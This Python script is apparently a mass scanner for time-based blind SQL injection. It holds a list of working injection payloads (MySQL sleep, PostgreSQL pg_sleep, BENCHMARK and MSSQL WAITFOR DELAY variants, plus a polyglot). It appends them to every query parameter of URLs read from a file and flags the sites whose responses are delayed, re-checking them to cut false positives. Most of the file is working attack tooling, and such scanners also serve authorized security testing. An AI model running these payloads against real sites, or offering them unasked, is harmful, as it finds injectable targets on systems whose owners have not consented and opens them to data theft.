import time

from furl import furl
import aiohttp, asyncio, async_timeout
from log import logger
import sys
import urllib.parse



#https://stackoverflow.com/questions/57126286/fastest-parallel-requests-in-python

first_time_second = 12
# first_time_second_payload = 12
# second_time_second = 20



_payloads="""
'+(select*from(select(sleep(12)))a)+'
'%2b(select*from(select(sleep(12)))a)%2b'
'||pg_sleep(12)'
+or+sleep(12)
-sleep(12)
IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(12))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(12)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(12)))OR"*/
-sleep/*f*/(12)
1'WAITFOR+DELAY+'0:0:12'
+or+WAITFOR+DELAY+'0:0:12'
""".split('\n')
_payloads = list(filter(None, _payloads))




def deletePayload(_payloads,testurl:str):
    for payload in _payloads:
        urlencoded_payload = urllib.parse.quote_plus(payload)
        testurl = testurl.replace(urlencoded_payload,'')
        testurl = testurl.replace(payload,'')
    return testurl

#https://bingo.paddypower.com/?AFF_ID=8535&ef_id=null& edgecase 
def generateOneTestUrl(url:str,payload:str)->str:
    #https://github.com/gruns/furl
    f =furl(url)
    # logger.log('INFO',f)
    for pname, pvalue in f.args.items():
        # logger.log('INFO',f"{pname}:  {pvalue}")
        if pname == '' or pvalue is None:
            continue
        f.args[pname] =  pvalue+payload
    return f.url

#dict{testurl:originalurl}
def generateTestUrls(urls:set,payloads:list)->set:
    testurls= set()
    for rawurl in urls:
        for payload in payloads:
            testurls.add(generateOneTestUrl(rawurl,payload))
            
    return testurls


#flag indicates whether it's the first time or second time to call this method 
async def testUrl(session, url,flag=1,timeout=60):
    start = time.time()
    res = ""
    # SECTION-UNDER-TEST
    try:
        with async_timeout.timeout(timeout):  # TIMEOUT-PROTECTED
            async with session.get(url) as response:
                while True:
                    chunk = await response.content.read(1024)
                    if not chunk:
                        break
                    res += str(chunk)
                await response.release()
    except Exception as e:
        logger.log('INFO', f' Connection to {url} encounter a problem  :  {e}     ')
        pass

    end = time.time()
    runtime = end - start
    if flag == 1: 
        if runtime > first_time_second:
            logger.log('INFO',f"Found url:{url} spent {runtime}s to get response, with a little chance to be vulnerable")
            return url,runtime
#only keeps useful data 
    if flag == 2: 
        if runtime < first_time_second/ 2:
            logger.log('INFO',f"Found url:{url} spent {runtime}s to get response, with a large chance chance to be vulnerable")
            return url,runtime
            

# return:  [('http://www.google.com', 21.05916452407837), ('https://www.example.org', 1.0362162590026855), ('https://stackoverflow.com/', 3.242276668548584), ('https://www.wikipedio.org', 0.8240408897399902)]
async def testUrlWrapper(async_loop, urls,flag=1):
    async with aiohttp.ClientSession(loop=async_loop) as session:
        corou_to_execute = [testUrl(session, url,flag) for url in urls]
        results = await asyncio.gather(*corou_to_execute)   #results [('a', 'b'), ('a', 'b'), ('a', 'b'),null]
        results = list(filter(None, results))
        return results          #results [('a', float), ('a', float), ('a', float)]

#edgecase results empty:  []
#data :  {"https://rawurl.com":{"testurl":test_url,"testtime",test_time}"}
def processFirstResult(results:list):
    if not results:
        return 
    data = {}
    for entry in results:
        test_url = entry[0]
        raw_url = deletePayload(_payloads,test_url)
        test_time = entry[1]
        data[raw_url] = {"testurl":test_url,"testtime":test_time}
    # logger.log('INFO',f"data:  {data}")
    
    return data


def deFalsePositive(data):

    rawurls = data.keys()

    event_loop = asyncio.get_event_loop()
    results = event_loop.run_until_complete(testUrlWrapper(event_loop, rawurls,flag=2))
    if not results:
        return
    
    newdata = {}

    for entry in results:
        raw_url = entry[0]
        raw_time = entry[1]
        newdata[raw_url] = data[raw_url]
        newdata[raw_url]["rawtime"] = raw_time
    # logger.log('INFO',f"newdata:  {newdata}")
    return newdata

def main(urls:set):
    testurls = generateTestUrls(urls,_payloads)
    logger.log('INFO', f'Generated  {len(testurls)} test urls to test for time blind sqli  ')
    

    event_loop = asyncio.get_event_loop()
    results = event_loop.run_until_complete(testUrlWrapper(event_loop, testurls))
    data = processFirstResult(results)
    if not data:
        logger.log('INFO',f"Maybe there aren't any vulnerble easy to detect time-based sqli in the input urls")
        return 
        
    newdata = deFalsePositive(data)
    if not newdata:
        logger.log('INFO',f"Maybe there aren't any vulnerble easy to detect time-based sqli in the input urls")
        return

    return newdata

if __name__ == '__main__':
    url_file = sys.argv[1]
    with open(url_file,'r') as f:
        urls = set(f.readlines())
        newdata = main(urls)
        if newdata:
            logger.log('INFO',newdata)